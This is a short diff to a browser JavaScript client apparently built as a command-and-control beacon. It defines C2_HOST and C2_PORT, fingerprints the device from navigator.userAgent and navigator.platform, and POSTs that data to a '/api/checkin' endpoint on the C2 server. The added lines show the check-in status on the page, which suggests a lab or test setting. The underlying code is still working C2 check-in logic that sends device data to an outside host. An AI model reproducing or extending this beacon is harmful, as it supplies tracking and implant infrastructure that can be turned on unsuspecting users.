@@ -25,9 +25,27 @@ var DEVICE_ID = navigator.userAgent.replace(/[^a-zA-Z0-9]/g,'').slice(0,20);
 var BASE_URL = 'http://' + C2_HOST + ':' + C2_PORT;
 
 function sendCheckin(){
+    var el = document.getElementById('msg');
+    el.textContent = 'Checking in...';
+    el.style.color = '#ff0';
     var xhr = new XMLHttpRequest();
     xhr.open('POST', BASE_URL + '/api/checkin', true);
     xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onreadystatechange = function(){
+        if (xhr.readyState === 4){
+            if (xhr.status === 200){
+                el.textContent = 'Checked in OK';
+                el.style.color = '#0f0';
+            } else {
+                el.textContent = 'Checkin failed: HTTP ' + xhr.status;
+                el.style.color = '#f00';
+            }
+        }
+    };
+    xhr.onerror = function(){
+        el.textContent = 'Checkin: Network/CORS error to ' + BASE_URL;
+        el.style.color = '#f00';
+    };
     xhr.send(JSON.stringify({
         device_id: DEVICE_ID,
         model: navigator.platform,
